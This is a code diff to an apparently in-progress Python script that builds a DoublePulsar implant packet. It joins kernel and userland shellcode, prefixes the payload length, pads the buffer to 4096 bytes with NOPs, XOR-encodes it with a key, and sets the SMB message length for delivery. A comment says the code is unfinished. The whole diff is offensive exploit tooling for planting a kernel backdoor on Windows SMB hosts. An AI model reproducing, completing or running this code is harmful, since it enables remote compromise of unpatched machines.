@@ -230,30 +230,10 @@ if __name__ == "__main__":
         # read file into memory here
         # read_dll_file_as_hex()
 
-        #kernel shellcode is for 64 bits at the moment
-        #create byte array of the kernel shellcode
-        modified_kernel_shellcode = bytearray(kernel_shellcode)
-
-        #add PAYLOAD shellcode length in bytes after the kernel shellcode and write this value
-        payload_shellcode_size = len(payload_shellcode)
-        value = struct.pack('<H', payload_shellcode_size)
-        modified_kernel_shellcode += value
-
-        #convert userland shellcode to bytearray
-        payload_shellcode = bytearray(userland_shellcode)
-
-        #add the userland shellcode after the shellcode size
-        modified_kernel_shellcode += payload_shellcode
-        
-        #hexdump the modified kernel shellcode
-        print(hexdump(modified_kernel_shellcode))
-        
         #sample XOR key, we'll use our real one that was generated above on line 214
         xor_key = 0x58581162
         packed_xor_key = struct.pack('<I', xor_key)
         print(packed_xor_key)
-        byte_xor(modified_kernel_shellcode, packed_xor_key)
-        print(hexdump(modified_kernel_shellcode))
         
         print("Generating the Doublepulsar parameters...")
         parameters = b''
@@ -278,6 +258,57 @@ if __name__ == "__main__":
         bytearray(b'b\x01XXb\x01XXb\x11XX')
         ['00000000  62 01 58 58 62 01 58 58  62 11 58 58             |b.XXb.XXb.XX    |']
         '''
+        
+        #kernel shellcode is for 64 bits at the moment
+        #create byte array of the kernel shellcode
+        modified_kernel_shellcode = bytearray(kernel_shellcode)
+
+        #add PAYLOAD shellcode length in bytes after the kernel shellcode and write this value
+        payload_shellcode_size = len(payload_shellcode)
+        value = struct.pack('<H', payload_shellcode_size)
+        modified_kernel_shellcode += value
+
+        #convert userland shellcode to bytearray
+        payload_shellcode = bytearray(userland_shellcode)
+
+        #add the userland shellcode after the shellcode size
+        modified_kernel_shellcode += payload_shellcode
+        
+        #hexdump the modified kernel shellcode
+        print(hexdump(modified_kernel_shellcode))
+        
+        #padding bytes to 4096 chunk size
+        final_shellcode_length = len(modified_kernel_shellcode)
+        print("Total size of shellcode before padding:  %d" % final_shellcode_length)
+        padded_bytes = 4096 - final_shellcode_length
+
+        bytes_filler_bytes = bytearray()
+        bytes_filler_bytes += b'\x90' * padded_bytes
+        modified_kernel_shellcode += bytes_filler_bytes
+        buffer_len = len(modified_kernel_shellcode)
+        print("Total size of shellcode after padding:  %d" % buffer_len)
+
+        #xor the payload data now
+        byte_xor(modified_kernel_shellcode, packed_xor_key)
+        print(hexdump(modified_kernel_shellcode))
+        
+        #update SMB length
+        #total_smb_len = len(str(SMB_HEADER)) + len(modified_kernel_shellcode) + len(parameters_bytearray)
+        total_smb_len = 70 + 4096 + 12 - 4
+        doublepulsar_pkt.SmbMessageLength = struct.pack('>i', total_smb_len)
+        #maybe: doublepulsar_pkt.SmbMessageLength = struct.pack('!h', total_smb_len)
+        print("Total SMB len", total_smb_len)
+        print(hexdump(doublepulsar_pkt.SmbMessageLength))
+
+        print("content of doublepulsar SMB packet")
+        print(vars(doublepulsar_pkt))
+        print("hex content of the paramters")
+        print(hexdump(parameters_bytearray))
+        print("hex content of the shellcode")
+        print(hexdump(modified_kernel_shellcode))
+        
+        
+       
         
         # fill up the SMB Trans2 Secondary packet structures
         # CODE IS NOT FINISHED HERE
